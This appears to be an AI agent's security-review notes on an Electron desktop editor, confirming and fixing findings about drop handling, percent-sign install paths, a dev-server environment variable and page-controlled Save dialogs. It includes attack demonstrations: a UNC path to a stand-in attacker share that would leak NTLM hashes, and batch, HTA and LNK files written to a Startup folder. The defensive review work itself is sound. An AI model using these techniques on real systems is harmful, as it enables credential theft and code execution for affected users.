confirmed.evidence: R/drop-open.mjs, real Electron. Save As a template to files/drop/Poster.pgfx, then dispatch a DataTransfer drop of the same bytes named Poster.pgfx. Sessions after the drop: `[{name:'Poster', path:'…/files/drop/Poster.pgfx'}, {name:'Poster', path:null}]`, i.e. a second copy. Edit the dropped copy and run file.save: the stubbed native Save dialog is opened with defaultPath `"Poster.pgfx"`, a bare name with no folder.
confirmed.fix: In the preload, expose `pathForFile: (f) => webUtils.getPathForFile(f)`. Add a main handler such as `desktop:adopt-dropped(path, sha256)`. It checks isSafeAbsPath and that the path is a regular file, reads it, and compares its SHA-256 with the hash of the bytes the page received. Only on a match does it grant read, plus write when it is a .pgfx or has PGFX magic, and return the path. A compromised page can then only get write access to project files whose exact bytes it already has. DropOverlay then calls openFileWithIo({ path, name, data }), which goes through focusOpenProject and addRecentFile like File ▸ Open. Fallback when no path can be obtained: make Save As use the last project folder rather than a bare name.

    `const { webUtils } = require('electron')`

  2. Check that fs.stat(p).isFile(). This rejects FIFOs and devices.

confirmed.title: Install path containing '%' gives a permanently blank window (the filter blocks the app's own index.html)
confirmed.issue: Electron's loadFile builds the page URL without escaping '%'. A folder such as `C:\Users\100%Real\…` or a custom NSIS install folder `D:\Apps 50%off\…` therefore yields `file:///…/100%Real/…`. Chromium loads that fine: an invalid escape stays a literal '%'. But fileUrlInside (lib.cjs:71) passes the URL to Node's fileURLToPath, which throws on '%Re' / '%of'. The catch returns false, and the webRequest filter cancels every request, starting with index.html. isAppUrl (main.cjs:96) has the same problem, so every IPC call is refused as untrusted, including close-ack: closing the blank window waits 4 s for the 'not responding' prompt. The user sees no error. Accented letters, spaces, '#', apostrophes and '&' all work, in both the unpacked and asar layouts.
confirmed.evidence: R/launch-in-dir2.mjs 'Apps 50%off' (and '100%Real'). main.log: `blocked file request file:///…/inst/Apps%2050%off/resources/app/dist/index.html` and `did-fail-load -20 ERR_BLOCKED_BY_CLIENT`. Page location `chrome-error://chromewebdata/`; `__app` and `.shell-root` are missing; desktop.userDataPath() fails with `ENOTGRANTED: desktop:user-data from an untrusted frame`. With Windows path rules, R/win-lib-test.cjs shows fileUrlInside returning false for the loadFile URL and the lazy chunks of C:\Users\100%Real\… and D:\Apps 50%off\… while returning true for accented, '#' and apostrophe paths. The fix was checked in Electron: R/libfix/lib.cjs plus the patched isAppUrl in R/app-pctfix, launched via R/launch-in-dir3.mjs from 'Apps 50%off fixed', loads the editor and IPC returns ok. All the blocked-URL cases in R/win-lib-test-fixed.cjs stay blocked.

In fileUrlInside: `fileURLToPath(url.replace(/%(?![0-9a-fA-F]{2})/g, '%25'), { windows: platform === 'win32' })`. Make isAppUrl use the same helper (for example `lib.fileUrlInside(url, INDEX_HTML)` or a shared `lib.fileUrlPath()`). Add `%` install folders to desktopMain.test.ts. I packaged snapshot 363ced4 with electron-builder (`--linux dir`, fuses applied) into /tmp/claude-0/-home-user-perseverance/4ac78a5e-4d63-575b-a9b6-afba01734b7e/scratchpad/rv-electron-security-v4/out/linux-unpacked. The packaged main.cjs is byte-identical to the snapshot (sha1 d99f0387…). Reading the fuse wire confirms RunAsNode, NODE_OPTIONS and inspect are off, and OnlyLoadAppFromAsar and asar integrity are on.

Script: /tmp/claude-0/-home-user-perseverance/4ac78a5e-4d63-575b-a9b6-afba01734b7e/scratchpad/rv-electron-security-v4/dev-url-packaged.mjs. It seeds file-access.json with one project from an "earlier session", starts the packaged binary with a .pgfx argument (like an Explorer double-click) and `VITE_DEV_SERVER_URL=http://127.0.0.1:5399/`, and serves a stand-in remote page on that port.

Observed (output in dev-url-packaged.out):
- The packaged app requested `GET /` from 127.0.0.1:5399 (user agent Perseverance/0.1.0 Electron/44.5.1) and never loaded the asar bundle.
- The remote page got `window.desktop` (bridge:true).
- `readFile` of the granted project returned its bytes.
- `writeFile` to it succeeded: the file on disk now reads "OVERWRITTEN BY REMOTE PAGE".
- The double-clicked project's path and bytes arrived through `onOpenFile`.
- `userDataPath()` answered.
- The clipboard-read permission was granted, because `ownPage()` uses `isAppUrl()`.
- Still blocked: reading a file that was never granted, `fetch(file:///etc/hostname)` (the webRequest filter) and non-http `openExternal`.

Control run with no variable (dev-url-control.out): the app loads the bundle from app.asar, the server gets 0 requests, and the file is untouched.

Code: main.cjs:9 sets `isDev = !!process.env.VITE_DEV_SERVER_URL` and nothing checks `app.isPackaged`. main.cjs:539 calls `loadURL` with that value. `isAppUrl` (main.cjs:90-92) then trusts that origin for `trusted()` (IPC), `ownPage()` (permissions) and will-navigate. HANDOFF.md does not list this as a known gap.

Two corrections to the finding. "Every granted project" overstates it: no API lists the grants, and the remote origin cannot see the file:// origin's localStorage recent list, so the page must guess paths. It does, however, receive every file the user opens through Explorer or a dialog, and can write those back.

Severity minor is correct, and I would not raise it. Setting a user environment variable (HKCU\Environment) already requires running code as that user. The install is per-user, in a user-writable folder, and the build is not code-signed. Such an attacker can already read the same files or replace the exe, so no privilege boundary is crossed. This is defense in depth, the same reasoning as the NODE_OPTIONS fuse. The accidental case is also minor: a user whose environment has this variable from other Vite/Electron tooling gets a blank or unrelated window instead of the editor.

Fix verified. I applied `const isDev = !app.isPackaged && !!process.env.VITE_DEV_SERVER_URL;` and rebuilt into out-fix. With the variable set, the packaged app now loads the bundle, the server gets 0 requests and the file is untouched (dev-url-fixed.out). The unpackaged dev flow (`electron <dir>` plus the variable, which is what scripts/electron-dev.cjs does) still loads the dev URL (devflow-fixed.out: 1 hit). The extra loopback-only check the finding suggests is optional hardening, since the packaged check alone closes the hole.
verdict.betterFix: The proposed fix is right; I tested it: `const isDev = !app.isPackaged && !!process.env.VITE_DEV_SERVER_URL;` at electron/main.cjs:9. isDev is computed once, so the loadURL call (:539), isAppUrl (:90) and the default-maximize rule (:465) all follow from it. Optionally, in dev, also require the URL to be http://localhost or http://127.0.0.1. Add a check to scripts/electron-desktop-check.mjs that launches with the variable set and asserts the page URL is file://…/dist/index.html, but run it against a packaged build, because an unpackaged launch has app.isPackaged false.

confirmed.title: Page controls the Save dialog's default path and extensions (network-share probe / NTLM leak, executable file types)
confirmed.issue: desktop:save-file (main.cjs:605-611) passes the page-supplied `defaultPath` (up to 32767 characters, unchecked) and any 1-16 character extension that sanitizeFilters (lib.cjs:98-110) accepts straight to dialog.showSaveDialog. On Windows, Electron's file dialog checks whether the default path or its parent folder exists and loads it as the dialog's starting folder. Both are file-system calls in the main process, made before the user does anything. A defaultPath such as `\\attacker\share\Poster.pgfx` therefore makes Windows connect to that server and offer the user's NTLM hash. That is the exact leak the read-file comment (main.cjs:648-649) guards against, and the network-share refusal does not apply here. A compromised page can also open what looks like the normal Save As, pre-filled into the Startup folder with a .lnk/.bat/.hta type and its own bytes; one Enter press means code runs at next login. The app itself only ever passes a bare file name or the document's own already-granted path, and only uses pgfx/png/jpg/jpeg/webp/psd. This is from reading the code: the Windows network side could not be tested here.
confirmed.evidence: Code: main.cjs:610 `const dlg = { title: str(opts.title, 200), defaultPath: str(opts.defaultPath, 32767), filters }`, with no isSafeAbsPath or grant check. lib.cjs:104 accepts any `[a-z0-9]{1,16}` extension (bat, cmd, lnk, hta, vbs, ps1, exe, scr all pass). The only legitimate callers (src/io/save.ts:84-85, src/io/exportRender.ts:212-217, src/io/psd.ts:317-321) pass `${name}.pgfx|png|jpg|webp|psd` or s.filePath.
confirmed.fix: In desktop:save-file, accept defaultPath only when it is a bare file name (no slashes or backslashes) or a path for which grants.canRead() is true, and never a network path (`^[\\/]{2}`); otherwise drop it. Check the filter extensions against an allowlist {pgfx, png, jpg, jpeg, webp, psd} in main and drop anything else.

verdict.note:
Confirmed. I reproduced it in the real Electron 44.5.1 app built from the snapshot, using the script /tmp/claude-0/-home-user-perseverance/4ac78a5e-4d63-575b-a9b6-afba01734b7e/scratchpad/rv-electron-security-v5/savefile-probe.mjs (output in probe/). Snapshot files were not modified.

A) Mocked dialog in main, calls made from the page through window.desktop.saveFile:
- defaultPath `\\attacker\share\Poster.pgfx` reaches dialog.showSaveDialog unchanged (main.cjs:610 does no check).
- I simulated pressing Enter on the pre-filled path. Page bytes `@echo off\r\necho pwned` were written to probe/Startup/Poster.bat (filters ['bat']).
- Poster2.hta was written with no filters at all, and Poster3.lnk with filter ['*'].
- ensureExtension (lib.cjs:118) does nothing when filters are missing or contain '*'.

B) Real GTK dialog under xvfb, with strace on the main process. Within the first 4.8 s, before any input, main ran stat() on the page-chosen `.../NOT-CREATED-probe-dir/Poster.pgfx` and a dialog thread ran statx() on its parent folder.
- For Windows I read Electron v44.5.1 shell/browser/ui/file_dialog_win.cc (saved in the scratch dir). ApplySettings calls IsDirectory(default_path), which calls base::GetFileInfo, which calls GetFileAttributesEx. SetDefaultFolder then calls SHCreateItemFromParsingName on the parent folder. Both run in the browser process before Show().
- With a UNC path, those calls make Windows connect to the remote host and offer NTLM credentials. That is the leak the read-file guard (main.cjs:648-649) and HANDOFF.md:98 ("no UNC paths") claim is closed.

This is not a listed known gap. The app's own callers are safe: save.ts:84 passes either a granted s.filePath (from an opened file or autosave, never from file contents) or a bare name; exportRender.ts:212 and psd.ts:317 pass bare names. So the hole only matters if the renderer is compromised, and the Startup-folder variant also needs one Enter press. That is defense-in-depth, which matches the threat model the code already enforces with grants. Minor is the right severity.

The proposed fix is mostly right but needs three changes. See betterFix.
verdict.betterFix:
In desktop:save-file only (main.cjs:605-611). Do not change sanitizeFilters globally: ModelImport.tsx:122/402 uses an 'All files' ['*'] filter in the Open dialog.

1) defaultPath:
- If `lib.isSafeAbsPath(dp) && grants.canRead(dp)`, pass it unchanged. Keep granted UNC paths: the user already chose that share. The proposal's blanket "never a network path" would lose the Save As folder for people who work from a NAS.
- Otherwise pass only `path.win32.basename(dp)` (strips both `/` and `\`). Reject names containing ':' or control characters, cap at 255 characters, and fall back to undefined.

2) Filters:
- Keep only extensions in SAVE_EXTS = {pgfx, png, jpg, jpeg, webp, psd}. '*' is excluded.
- If no filter survives, or none was sent, throw (or force PROJECT_FILTERS). An allowlist alone leaves the hole open: with filters undefined, ensureExtension is a no-op, and that is how the .hta in the repro was written.
- With a non-empty allowlisted filter list, ensureExtension already guarantees the final extension, even when the user types "x.bat" (it becomes x.bat.pgfx).

3) Add checks to scripts/electron-desktop-check.mjs, with the dialog mocked as in savefile-probe.mjs:
- A UNC defaultPath is cut down to its base name.
- A 'bat' filter or no filters is refused.
- An ungranted folder in defaultPath is dropped.
